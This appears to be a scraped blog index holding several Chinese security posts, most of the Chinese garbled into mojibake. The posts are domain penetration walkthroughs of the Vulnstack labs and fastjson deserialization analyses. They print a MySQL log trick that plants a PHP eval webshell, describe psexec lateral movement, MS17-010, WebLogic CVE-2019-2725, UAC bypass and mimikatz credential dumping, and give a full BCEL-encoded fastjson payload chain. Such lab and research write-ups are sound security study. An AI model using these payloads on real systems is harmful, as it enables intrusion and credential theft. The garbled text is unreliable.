general_log_file = &apos;C:/phpStudy/WWW/cmd.php &apos;;select &apos;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&apos;;set global general_log = &apos;OFF&apos;; èšå‰‘è¿ä¸Šå»å‘ç°è¿˜æœ‰å¤‡ä»½å’Œä¸€ä¸ªcmsï¼Œå­—å…¸å°æ²¡æœ‰æ‰«åˆ°ï¼Œcmsè¿™ä¸ªæ–¹å‘åº”è¯¥ä¹Ÿèƒ½getshellï¼Œä½†è¿™é‡Œå…ˆæŒ‰ä¸‹ä¸è¡¨ã€‚ æ¨ªå‘ç§»åŠ¨åœ¨èšå‰‘çš„æ¨¡æ‹Ÿç»ˆç«¯çœ‹äº†ä¸‹ï¼Œæ²¡æœ‰æ€è½¯ï¼Œå¯ä»¥ç›´æ¥powershellæ— æ–‡ä»¶ä¸Šçº¿ã€‚ ä¹Ÿå› ä¸ºæ˜¯phpStudyï¼Œæ‰€ä»¥webshellä¹Ÿç›´æ¥æ˜¯é«˜æƒé™ï¼Œææƒéƒ½çœäº†ã€‚çœ‹äº†ä¸‹å­˜åœ¨åŸŸï¼Œå½“å‰è´¦å·å°±æ˜¯åŸŸç®¡ç†å‘˜ï¼ŒåŸŸå†…ä¸»æœºæœ‰ä¸‰å°ã€‚ 12net group \"domain admins\" /domainnet group \"domain computers\" /domain æœ‰äº†åŸŸç®¡ç†å‘˜è´¦å·ï¼Œè®²é“ç†ç›´æ¥æ¨ªå‘ç§»åŠ¨å°±è¡Œï¼Œä½†è¿™é‡Œå†…ç½‘ä¸»æœºä¸å‡ºç½‘ï¼Œè¿˜è¦åšç‚¹å‰ç½®æ“ä½œã€‚å¯¹æ¯”äº†å‡ ç§æ–¹æ³•ï¼Œè§‰å¾—smbç®¡é“æ­£å‘è¿æ¥æ¯”è¾ƒç®€ä¾¿ã€‚ åœ¨ç›‘å¬åˆ—è¡¨æ·»åŠ ä¸€ä¸ªSMBçš„Beaconã€‚ é€‰æ‹©å½“å‰sessionï¼Œæ´¾ç”Ÿåˆ°SMB Beaconã€‚ psexecæ¨ªå‘ç§»åŠ¨ç›‘å¬é€‰smbï¼Œsessioné€‰æ´¾ç”Ÿå‡ºæ¥çš„sessionã€‚ æ¥ç€ç­‰ä¸€å°ä¼šå°±èƒ½ä¸Šçº¿äº†ï¼Œå‘½ä»¤èƒ½æ­£å¸¸æ‰§è¡Œã€‚ å½“ç„¶é™¤äº†ç”¨åŸŸç®¡ç†å‘˜æ¨ªå‘ç§»åŠ¨ï¼ŒMS17-010ä¹Ÿå¾ˆå¯èƒ½èƒ½æ‰“å¾—åˆ°ã€‚CSä¸Šçš„MS17-010è¯´å®è¯ç¡®å®ä¸å¥½ç”¨ï¼Œæ‰€ä»¥å…ˆæ´¾ç”Ÿä¸ªsessionåˆ°msfä¸Šï¼Œç”¨autorouteråšå¥½è·¯ç”±åï¼Œç”¨auxiliary/admin/smb/ms17_010_commandæ¨¡å—ï¼Œä¸å‡ºæ‰€æ–™å°±æ‰“åˆ°äº†ã€‚å…¶ä»–æ¨¡å—æ‰“ä¸åŠ¨ï¼Œæœ‰æ—¶å€™ç”šè‡³å›é‡å¯ï¼Œä¹Ÿå°±ç®—äº†ã€‚","link":"/2020/10/13/[åŸŸæ¸—é€]Vulnstack1_walkthrough/"},{"title":"[åŸŸæ¸—é€]Vulnstack2_walkthrough","text":"å‰è¨€For some reason,I canâ€™t explain.é¶æœºä¸‹å®Œå¥½å‡ å¤©äº†ï¼Œç°åœ¨æ‰å†™walkthroughï¼Œä¸»è¦æ˜¯å¤ªèœäº†ï¼Œåˆ°ç°åœ¨è¿˜æ²¡äººæã€‚ã€‚ã€‚vulnstack2æ¯”vulnstack1å¤æ‚ä¸€ç‚¹ç‚¹ï¼Œä½†ä¹Ÿä¸éš¾ï¼Œä¸è¿‡ä¹Ÿæ˜¯è®¾è®¡å¾—ä¸é”™å¾—ä¸€ä¸ªé¶æœºã€‚æ„Ÿè°¢çº¢æ—¥å®‰å…¨å’Œde1ayå¸ˆå‚…æä¾›çš„é¶æœºã€‚ ç¯å¢ƒæ­å»ºè¿™æ¬¡ä¹Ÿè·Ÿvulnstack1ä¸€æ ·ï¼Œåˆ’åˆ†äº†ä¸¤ä¸ªè™šæ‹Ÿç½‘ç»œã€‚å­ç½‘åœ°å€åˆ†åˆ«ä¸º192.168.111.0å’Œ10.10.10.0ã€‚ WEB.de1ay.comçš„ä¸¤å¼ ä¸‡å¡åˆ†åˆ«è¿ä¸ŠVMnet1å’ŒVMnet2 PC.de1ay.comä¹Ÿæ˜¯è¿ä¸ŠVMnet1å’ŒVMnet2 DC.de1ay.comåˆ™åªéœ€è¦è¿ä¸ŠVMnet2 æ”»å‡»è€…ä¸»æœºè¿ä¸ŠVMnet æœ€åéœ€è¦ä½¿ç”¨è´¦å·de1ay\\administratorå’Œå¯†ç 1qazç™»å½•åˆ°WEB.de1ay.comï¼Œè¿›å…¥åˆ°C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\binç›®å½•ï¼ŒåŒå‡»startWebLogicæ‰¹å¤„ç†è„šæœ¬ï¼Œå¯åŠ¨WebLogicã€‚ æ¼æ´åˆ©ç”¨ä¿¡æ¯æ”¶é›†WEB.de1ay.comè¿™å°ä¸»æœºå¼€æ”¾äº†å¾ˆå¤šç«¯å£ï¼Œå…¶ä¸­80ã€1433ã€3389å’Œ7001å°±æ¯”è¾ƒæœ‰ç”¨ï¼Œè¿™é‡Œ7001å°±æ˜¯WebLogicçš„é»˜è®¤ç«¯å£ã€‚å¦ä¸€å°ä¸»æœºæš‚æ—¶å¯èƒ½å°±3389ç«¯å£æ¯”è¾ƒæœ‰ç”¨ã€‚ WEB.de1ay.comçš„80ç«¯å£è¿›å»å°±æ˜¯ç©ºç™½é¡µé¢ï¼Œæ‰«ç›®å½•é¡µæ²¡æœ‰æ‰«åˆ°æ‰«ä¸œè¥¿ã€‚ 7001ç«¯å£ç›´æ¥åœ¨æµè§ˆå™¨ä¸Šæ‰“å¼€å°±çœ‹åˆ°æ˜æ˜¾æ˜¯WebLogicçš„404é¡µé¢ï¼Œè¾“å…¥è·¯å¾„/console/login/LoginForm.jspå°±èƒ½WebLogicçš„ç™»å½•ç•Œé¢ã€‚ æ‰“ç‚¹æ—¢ç„¶ç”±WebLogicï¼Œé‚£å°±é¡ºç†æˆç« åœ°æ‹¿WeblogicScanæ‰«äº†ä¸‹ï¼Œå­˜åœ¨CVE-2019-2725ã€‚ åˆšå¥½msfé‡Œæœ‰è¿™ä¸ªæ´çš„åˆ©ç”¨è„šæœ¬ï¼Œç›´æ¥ä¸€æŠŠæ¢­getshellã€‚æ³¨æ„è¿™é‡Œtargeté»˜è®¤æ˜¯unixï¼Œç”¨å‘½ä»¤set target 1å°±å¯ä»¥æŠŠtargetè®¾ç½®ä¸ºWindowsã€‚ æœ€årunå°±ä¼šè¿”å›ä¸ªmeterpeterçš„sessionï¼Œæ²¡ä»€ä¹ˆéš¾åº¦ã€‚ BypassUACä¸ªäººæ¨ªå‘ç§»åŠ¨æ›´å–œæ¬¢ç”¨cobaltstrikeï¼Œæ‰€ä»¥ç”¨msfçš„payload_injectæŠŠsessionæ´¾ç”Ÿåˆ°cobaltstrikeã€‚ åœ¨csä¸Šçœ‹åˆ°sessionçš„ç”¨æˆ·æ˜¯administratorï¼Œå‡†å¤‡æ”¶é›†åŸŸä¿¡æ¯æ—¶ï¼Œé‡åˆ°äº†æ‹’ç»è®¿é—®ï¼Œä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯360çš„é”…ï¼Œä½†åœ¨WEBçš„è™šæ‹Ÿæœºä¸Šï¼Œçœ‹360ä¸ä¸ºæ‰€åŠ¨ã€‚æŸ¥ä¸‹èµ„æ–™å¾—çŸ¥æ˜¯UACçš„é—®é¢˜ï¼Œç”¨cs4.0ææƒæ¨¡å—é‡Œçš„svc-exeå³å¯ç»•è¿‡UACã€‚ å¥½å¥‡è¿™ä¸ªsvc-exeæ˜¯ä»€ä¹ˆåŸç†ï¼Œåˆæœäº†ä¸‹è´¨æ–™å¾—åˆ°è¿™æ ·çš„è§£é‡Šï¼špsexecæ‰“è‡ªå·±ã€‚ ä¿¡æ¯æ”¶é›†ç»•è¿‡UACåï¼Œé¡ºåˆ©æ”¶é›†åˆ°äº†åŸŸä¿¡æ¯ï¼Œå½“å‰ç”¨æˆ·å°±æ˜¯åŸŸç®¡ç†å‘˜ï¼ŒåŸŸæ§åœ¨é‡Œä¸€å°æœºå­ã€‚ mimikatzè¯»äº†ä¸€æ³¢å¯†ç ï¼Œé¡ºä¾¿ç¿»äº†ç¿»ä¸»æœºä¸Šçš„æ–‡ä»¶ï¼Œæ„Ÿè§‰æ²¡ä»€ä¹ˆæ•æ„Ÿä¿¡æ¯ã€‚ipconfigçœ‹äº†ä¸‹åˆä¸¤ä¸ªç½‘æ®µï¼Œ10.10.10.1/24çš„å°±æ˜¯å†…ç½‘ç½‘æ®µã€‚arpæ‰«æä¸‹å†…ç½‘ï¼Œæœ‰ä¸€ä¸ªåŸŸæ§ï¼Œå¦ä¸€ä¸ªå°±æ˜¯åŸŸæˆå‘˜ä¸»æœºã€‚ æ¨ªå‘ç§»åŠ¨administratoræ˜¯åŸŸç®¡ç†å‘˜ï¼Œä½¿ç”¨administartorçš„å‡­è¯æ¨ªå‘ç§»åŠ¨å°±è¡Œäº†ï¼Œä½†è¿™é‡Œé‡åˆ°ä¸ªå‘ï¼Œæ²¡ç»•è¿‡UACä¹‹å‰æ¨ªå‘ç§»åŠ¨éƒ½å¤±è´¥äº†ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯è®¾ç½®äº†æŸäº›ç­–ç•¥çš„é—®é¢˜ã€‚ã€‚ã€‚ ä½¿ç”¨csçš„psexecè¿›è¡Œæ¨ªå‘ç§»åŠ¨ï¼ŒSessionåˆ™é€‰æ‹©SYSTEMæƒé™çš„sessionã€‚åœ¨å†…ç½‘ä¸å‡ºç½‘æƒ…å†µä¸‹ï¼Œä¸Šçº¿DCåªéœ€è¦åƒä¸Šå›é‚£æ ·ç”¨smbçš„Listenerå³å¯ã€‚ PCçš„ä¸Šçº¿æ“ä½œä¹Ÿå·®ä¸å¤šï¼Œç°åœ¨æ‰€æœ‰çš„ä¸»æœºéƒ½ä¸Šäº†çº¿äº†ã€‚ é¡ºä¾¿è¯´ä¸‹DC.de1ay.comè¿˜å­˜åœ¨MS17-010ï¼Œä½†æ˜¯ç”¨msfçš„å‘½ä»¤æ‰§è¡Œçš„payloadæ‰“ä¸€æ¬¡ï¼Œsessionå°±æ–­ä¸€æ¬¡ï¼Œå¤ªéš¾å—äº†ã€‚ è¿˜æœ‰æœ€è¿‘é‚£ä¸ªZerologonä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæ¯•ç«Ÿæ˜¯æœ€æ–°çš„æ´ï¼Œä½†é‚£socksä»£ç†æ­»æ´»è¿ä¸ä¸Šå†…ç½‘/æ‚è„¸ã€‚åªå¥½æŠŠç½‘å¡ç›´æ¥æ¥åˆ°å†…ç½‘ã€‚","link":"/2020/10/20/[åŸŸæ¸—é€]Vulnstack2_walkthrough/"},{"title":"fastjsonä¸å‡ºç½‘åˆ©ç”¨ç®€æ","text":"å‰è¨€åˆæ¥ç‚’å†·é¥­å•¦ï¼Œåšé¡¹ç›®ç»ˆäºé‡åˆ°ä¸ªfastjsonååºåˆ—åŒ–ï¼Œä½†åˆä¸æƒ³è´¡çŒ®è‡ªå·±çš„VPSå‡ºæ¥æ­ä¸ªJNDIï¼Œäºæ˜¯ç½‘ä¸Šæ‰¾ä¸ªPOCè¯•äº†ä¸‹ã€‚Duangçš„ä¸€ä¸‹ç«Ÿç„¶æˆåŠŸäº†ï¼Œæ‰§è¡Œå‘½ä»¤è¿˜æœ‰å›æ˜¾ï¼Œæœ‰ç‚¹æ„æ€å•Šï¼Œäºæ˜¯å¼€å§‹ç‚’å†·é¥­äº†ã€‚ åˆ©ç”¨å‰ææ—¢ç„¶æ˜¯ä¸å‡ºç½‘ï¼Œè®¸å¤šPOCä¸­åˆ©ç”¨JNDIè¿œç¨‹åŠ è½½å¤–éƒ¨ç±»çš„æ–¹æ³•å°±æ— æ³•ä½¿ç”¨äº†ï¼Œä¸å‡ºç½‘çš„åˆ©ç”¨éœ€è¦æ— éœ€åŠ è½½ç±»æˆ–å¯é€šè¿‡ç±»å±æ€§åŠ è½½ã€‚å¦ä¸€ä¸ªå‰æå°±æ˜¯è·å–å‘½ä»¤çš„æ‰§è¡Œç»“æœï¼Œå¯ä»¥å°†ç»“æœå†™å…¥åˆ°webç›®å½•ï¼Œè®¿é—®è¯¥æ–‡ä»¶è·å–ç»“æœï¼Œä½†æ›´ä¼˜é›…çš„æ–¹å¼æ˜¯è·å–responseï¼Œå°†ç»“æœä»å“åº”ä¿¡æ¯ä¸­è¾“å‡ºã€‚ è¿œç¨‹åŠ è½½ç±»ç›®å‰å…¬å¼€ä¸”è¾ƒä¸ºé€šç”¨çš„ä¸å‡ºç½‘åˆ©ç”¨é“¾æœ‰ä¸¤æ¡ã€‚ com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl org.apache.tomcat.dbcp.dbcp2.BasicDataSource TemplatesImplä¸Šä¸€ç¯‡æ–‡ç« å·²ç»åˆ†æè¿‡äº†ï¼Œååºåºåˆ—åŒ–æ–¹æ³•ä¸­featureå‚æ•°éœ€è¦è®¾ç½®ä¸ºå…è®¸ç»™éå…¬æœ‰å±æ€§èµ‹å€¼ï¼Œä¸BasicDataSourceç›¸æ¯”å°±æœ‰äº›é¸¡è‚‹äº†ã€‚BasicDataSourceåªéœ€è¦æœ‰dbcpæˆ–tomcat-dbcpçš„ä¾èµ–å³å¯ï¼Œdbcpå³æ•°æ®åº“è¿æ¥æ± ï¼Œåœ¨javaä¸­ç”¨äºç®¡ç†æ•°æ®åº“è¿æ¥ï¼Œè¿˜æ˜¯æŒºå¸¸è§çš„ã€‚ ä»¥ä¸‹æ˜¯ä¸€ä¸ªåŠ è½½æ¶æ„ç±»ï¼Œè€Œæ¶æ„ç±»é™æ€ä»£ç ä¸­æœ‰å†™äº†Runtimeå¼¹è®¡ç®—å™¨çš„POCï¼Œè€æ ·å­åœ¨execæ–¹æ³•å¤„ä¸‹æ–­ç‚¹ï¼Œå‘ç°è°ƒç”¨æ ˆè¿˜æ˜¯æ¯”è¾ƒé’±çš„ï¼Œå¯ä»¥ä»å¼€å¤´å¼€å§‹åˆ†æã€‚ 1234567891011121314151617181920package com.p1ay2win.fastjson;import com.alibaba.fastjson.JSON;public class BCEL { public static void main(String[] args){ String payload2 = \"{\\n\" + \" {\\n\" + \" \\\"x\\\":{\\n\" + \" \\\"@type\\\": \\\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\\\",\\n\" + \" \\\"driverClassLoader\\\": {\\n\" + \" \\\"@type\\\": \\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"\\n\" + \" },\\n\" + \" \\\"driverClassName\\\": \\\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\\\"\\n\" + \" }\\n\" + \" }: \\\"x\\\"\\n\" + \"}\"; JSON.parse(payload2); }} ç›´æ¥è·Ÿè¿›åˆ°com.alibaba.fastjson.parser.DefaultJSONParser#parseObjectï¼Œå½“ååºåˆ—åŒ–çš„å¯¹è±¡ä¸ºJSONObjectæ—¶ï¼Œä¼šè°ƒç”¨é”®çš„toStringæ–¹æ³•ã€‚æ­¤æ—¶çš„é”®æ˜¯é”®ä¸ºxï¼Œå€¼ä¸ºBasicDataSourceå¯¹è±¡çš„JSONObjectå¯¹è±¡ã€‚ è·Ÿè¿›com.alibaba.fastjson.JSON#toStringï¼Œè¿”å›çš„æ˜¯å®ƒçš„toJSONStringæ–¹æ³•çš„å€¼ã€‚æ¥ç€åˆå¥—å¨ƒè°ƒç”¨äº†ä¸‰æ¬¡writeæ–¹æ³•ï¼Œæ¥åˆ°äº†com.alibaba.fastjson.serializer.ASMSerializer_1_BasicDataSource#writeã€‚IDEAå¹¶ä¹ˆæœ‰è¯†åˆ«å‡ºASMSerializer_1_BasicDataSourceçš„æºç ï¼Œä¹Ÿå°±æ˜¯com.alibaba.fastjson.serializerä¸‹å¹¶æ²¡æœ‰è¿™ä¸ªç±»ã€‚ å›åˆ°com.alibaba.fastjson.serializer.MapSerializer#writeè°ƒç”¨serializerå±æ€§çš„getObjectWriteræ–¹æ³•å¤„è·Ÿè¿›ï¼Œå‘ç°æœ€ç»ˆè°ƒç”¨çš„æ˜¯com.alibaba.fastjson.serializer.SerializeConfig#createASMSerializerï¼ŒASMSerializerFactoryå·¥å‚ç±»ç”Ÿæˆäº†BasicDataSourceçš„ASMSerializerä¸“å±å­ç±»ASMSerializer_1_BasicDataSourceã€‚ å…³äºASMSerializer_1_BasicDataSourceè¿™ä¸ªç±»ï¼Œè¿™é‡Œå°±æ¶‰åŠäº†ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šASMã€‚ ASMæ˜¯ä¸€ä¸ªé€šç”¨çš„Javaå­—èŠ‚ç æ“ä½œå’Œåˆ†ææ¡†æ¶ï¼Œå®ƒå¯ä»¥ç”¨æ¥ä¿®æ”¹ç°æœ‰çš„ç±»æˆ–ç›´æ¥ä»¥äºŒè¿›åˆ¶å½¢å¼åŠ¨æ€ç”Ÿæˆç±»ã€‚ASMæä¾›äº†ä¸€äº›å¸¸è§çš„å­—èŠ‚ç è½¬æ¢å’Œåˆ†æç®—æ³•ï¼Œä»ä¸­å¯ä»¥æ„å»ºå®šåˆ¶çš„å¤æ‚è½¬æ¢å’Œä»£ç åˆ†æå·¥å…·ã€‚ASMæä¾›äº†ä¸å…¶ä»–Javaå­—èŠ‚ç æ¡†æ¶ç±»ä¼¼çš„åŠŸèƒ½ï¼Œä½†ä¾§é‡äºæ€§èƒ½ã€‚å› ä¸ºå®ƒçš„è®¾è®¡å’Œå®ç°éƒ½å°½å¯èƒ½å°å’Œå¿«ï¼Œæ‰€ä»¥å®ƒéå¸¸é€‚åˆåœ¨åŠ¨æ€ç³»ç»Ÿä¸­ä½¿ç”¨ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ä»¥é™æ€æ–¹å¼ä½¿ç”¨ï¼Œä¾‹å¦‚åœ¨ç¼–è¯‘å™¨ä¸­ï¼‰ã€‚ ç”Ÿæˆè¿™ä¸ªç±»çš„writeæ–¹æ³•ä¸­ä¼šè°ƒç”¨BasicDataSourceç±»çš„getteræ–¹æ³•ï¼Œå…¶ä¸­å°±æœ‰æœ€å¼€å§‹è°ƒç”¨æ ˆä¸­çš„org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnectionæ–¹æ³•ã€‚æ¥ç€è·Ÿè¿›åˆ°org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactoryï¼Œå½“driverClassLoaderéç©ºæ—¶ï¼Œä¼šè°ƒç”¨loaderå¯æ§çš„forNameé‡è½½æ–¹æ³•ã€‚ æ­¤æ—¶çš„loaderæ˜¯BCELçš„ClassLoaderï¼Œè¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ClassLoaderã€‚å½“åå°„çš„ç±»åæ˜¯$$BCEL$$å¼€å¤´æ—¶ï¼Œä¼šå°†ç±»åå‰©ä½™éƒ¨åˆ†è§£ç ä½œä¸ºè¾“å…¥æµï¼Œè§£æå¹¶è¿”å›ä¸€ä¸ªClasså®ä¾‹ï¼Œé‚£ä¹ˆæ¶æ„ç±»çš„é™æ€ä»£ç ä¸­çš„æ¶æ„ä»£ç å°±ä¼šè¢«æ‰§è¡Œã€‚ å›æ˜¾åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ä¸¤ä¸²BCELå›æ˜¾çš„POCï¼Œä½¿ç”¨BCELè‡ªå¸¦çš„Utilityå·¥å…·ç±»è§£ç ï¼Œä¿å­˜ä¸º.classæ–‡ä»¶å°±å¯ä»¥ç”¨IDEAåç¼–è¯‘ç›´æ¥çœ‹ã€‚è§£ç Demoå¦‚ä¸‹ï¼š 12345678public class BCELDecode { public static void main(String[] args) throws IOException { String encode = \"$l$8b$I$A$A$A$A$A$A$A...\"; byte[] decode = Utility.decode(encode,true); FileOutputStream fileOutputStream = new FileOutputStream(\"DecodeClass.class\"); fileOutputStream.write(decode); }} å…ˆæ¥çœ‹çœ‹Springè·å–requestå’Œresponseçš„åŠæ³•ï¼Œæ˜¯ä¸€ç§è¾ƒä¸ºé€šç”¨çš„æ–¹æ³•ã€‚Springåœ¨è¯·æ±‚é¢„å¤„ç†è°ƒç”¨processRequestæ–¹æ³•çš„æ—¶å€™ï¼Œä¼šå°†requestå’Œresponseæ”¾è¿›RequestContextHolderçš„çº¿ç¨‹å±€éƒ¨å˜é‡é‡Œï¼Œæ‰€ä»¥å½“å‰çº¿ç¨‹çš„ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥å–ç”¨åˆ°requestå’Œresponseã€‚ åœ¨çœ‹çœ‹tomcatçš„å›æ˜¾ï¼Œä»£ç ç¨é•¿ï¼Œåˆ©ç”¨çš„æ˜¯c0ny1å¸ˆå‚…æå‡ºçš„ä¸€ç§æ–¹æ³•ï¼Œæ·±åº¦ä¼˜å…ˆæœç´¢éå†å½“å‰çº¿ç¨‹çš„æ‰€æœ‰å±æ€§æ‰¾åˆ°requestå’Œresponseï¼Œæ˜¯tomcatä¸Šä¸€ç§è¾ƒä¸ºé€šç”¨çš„å›æ˜¾æ–¹æ³•ã€‚è¯¦ç»†çš„åˆ†æå¯ä»¥åœ¨c0ny1çš„æ–‡ç« ï¼šåŠè‡ªåŠ¨åŒ–æŒ–æ˜ request å®ç°å¤šç§ä¸­é—´ä»¶å›æ˜¾ä¸­çœ‹åˆ°ï¼Œè¿™é‡Œå°±ä¸å±•å¼€è¯´ã€‚ ä»¥ä¸Šä¸¤ç§æ–¹æ³•éƒ½ç”¨Thread.currentThread().getContextClassLoader()è·å–ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨æ¥åŠ è½½ç±»ï¼Œä¸ªäººçš„ç†è§£å‘¢ï¼Œæ˜¯å› ä¸ºJavaçš„åŒäº²å§”æ´¾æœºåˆ¶ã€‚ç›´æ¥ä½¿ç”¨Class.forNameåŠ è½½çš„è¯ï¼Œåœ¨ååºåˆ—åŒ–æˆ–åŠ è½½å†…å­˜é©¬çš„ç‚¹çš„ç±»åŠ è½½å™¨æ˜¯springå’Œtomcatç±»çš„ç±»åŠ è½½å™¨çš„parentç±»åŠ è½½å™¨ï¼Œæˆ–æ˜¯ä¸ä»–å¹³è¡Œçš„åˆ†æ”¯ï¼Œç›´æ¥ç”¨Class.forNameå°±æ— æ³•åŠ è½½åˆ°springå’Œtomcatçš„ç±»ã€‚ è€ŒSpringå’Œtomcatåˆå› ä¸ºä¸åŒWebåº”ç”¨ä¸åŒç‰ˆä¾èµ–æœ¬å…±å­˜ã€åŠ¨æ€åŠ è½½jspç­‰ä¸€äº›åŸå› æ‰“ç ´äº†åŒäº²å§”æ´¾æœºåˆ¶ï¼Œä¼šå°†å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨è®¾ç½®ä¸ºä»–ä»¬å„è‡ªçš„Webåº”ç”¨ç±»åŠ è½½å™¨ï¼Œåˆšå¥½å°±èƒ½é€šè¿‡ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨åŠ è½½åˆ°æƒ³è¦çš„Springå’Œtomcatç±»ã€‚ ä»¥ä¸Šæ˜¯ä¸ªäººå¯¹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨åœ¨å›æ˜¾ä¸­ä½œç”¨çš„ä¸ªäººç†è§£ï¼Œè‹¥å…¶ä¸­æœ‰è¯¯ï¼Œæ¬¢ç”¨å„ä½å¸ˆå‚…æ–§æ­£ã€‚ åè®°ä»¥ä¸Šæ¶‰åŠçš„çŸ¥è¯†ç‚¹ä¹Ÿå°±æ˜¯BCELçš„Classloaderç‰¹æ€§ã€åŒäº²å§”æ´¾æœºåˆ¶å’Œæ‰“ç ´åŒäº²å§”æ´¾çš„æ–¹æ³•ï¼Œå¥½åƒä¹Ÿæ²¡ä»€ä¹ˆï¼Œä½†è¿™æ®µæ—¶é—´çš„å¿ƒè·¯å†ç¨‹è®©æˆ‘æƒ³èµ·æ¥ç‹å®¶å«ä¸œé‚ªè¥¿æ¯’é‡Œçš„ä¸€å¥ æ¯ä¸ªäººéƒ½ä¼šç»å†è¿™ä¸ªé˜¶æ®µï¼šçœ‹è§ä¸€åº§å±±ï¼Œå°±æƒ³çŸ¥é“å±±åé¢æ˜¯ä»€ä¹ˆã€‚æˆ‘å¾ˆæƒ³å‘Šè¯‰ä»–ï¼Œå¯èƒ½ç¿»è¿‡å»å±±åé¢ï¼Œä½ ä¼šå‘è§‰æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«ã€‚å›å¤´çœ‹ï¼Œä¼šè§‰å¾—è¿™ä¸€è¾¹æ›´å¥½ã€‚ä½†æˆ‘çŸ¥é“ä»–ä¸ä¼šå¬ï¼Œä»¥ä»–çš„æ€§æ ¼ï¼Œè‡ªå·±ä¸è¯•è¿‡ï¼Œåˆæ€ä¹ˆä¼šç”˜å¿ƒï¼Ÿ å‚è€ƒhttps://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html https://github.com/depycode/fastjson-local-echo https://segmentfault.com/a/1190000040160637 https://segmentfault.com/a/1190000040188046 https://paper.seebug.org/1181/","link":"/2021/11/25/fastjsonä¸å‡ºç½‘åˆ©ç”¨ç®€æ/"},{"title":"fastjsonååºåˆ—åŒ–æ¼æ´å­¦ä¹ ","text":"å‰è¨€fastjsonååºåˆ—åŒ–ï¼ŒJAVAå®‰å…¨ç»•ä¸è¿‡çš„åã€‚ ååºåˆ—åŒ–åŸç†ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œfastjsonååºåˆ—åŒ–çš„ç»“æœæ˜¯ä¸€ä¸ªJSONObjectçš„å¯¹è±¡ï¼Œä½†åœ¨åºåˆ—åŒ–æ—¶è®¾ç½®SerializerFeatureä¸ºWriteClassNameï¼Œåºåˆ—åŒ–çš„å­—ç¬¦ä¸²å°±ä¼šå¤šä¸€ä¸ª@typeçš„é”®å€¼å¯¹ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šæŒ‰ç…§@typeçš„å€¼ï¼Œè¿”å›ç›¸åº”çš„å¯¹è±¡ã€‚ å®éªŒä»£ç å’Œè¿è¡Œç»“æœå¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°å½“ååºåˆ—åŒ–çš„æ–¹æ³•ä¸ºparseå’ŒparseObjectä¸”ä¼ å…¥å‚æ•°ä¸ºjsonå­—ç¬¦ä¸²å’ŒClasså®ä¾‹æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ç»™å®šç±»çš„æ„é€ æ–¹æ³•å’Œsetteræ–¹æ³•ï¼›å½“æ”¾åºåˆ—åŒ–æ–¹æ³•ä¸ºparseObjectä¸”åªä¼ å…¥jsonå­—ç¬¦ä¸²æ—¶ï¼Œä¼šè°ƒç”¨ç»™å®šç±»çš„æ„é€ æ–¹æ³•ã€setteræ–¹æ³•å’Œå…¨éƒ¨çš„getteræ–¹æ³•ã€‚ 1234567891011public static void main(String[] args){ TestClass testClass = new TestClass(); String json = JSON.toJSONString(testClass, SerializerFeature.WriteClassName); System.out.println(json); System.out.println(\"---------------------------\"); JSON.parse(json); System.out.println(\"---------------------------\"); JSON.parseObject(json); System.out.println(\"---------------------------\"); JSON.parseObject(json,TestClass.class);} ç»¼ä¸Šï¼Œæ„é€ payloadçš„å…¥å£ç±»çš„æ„é€ 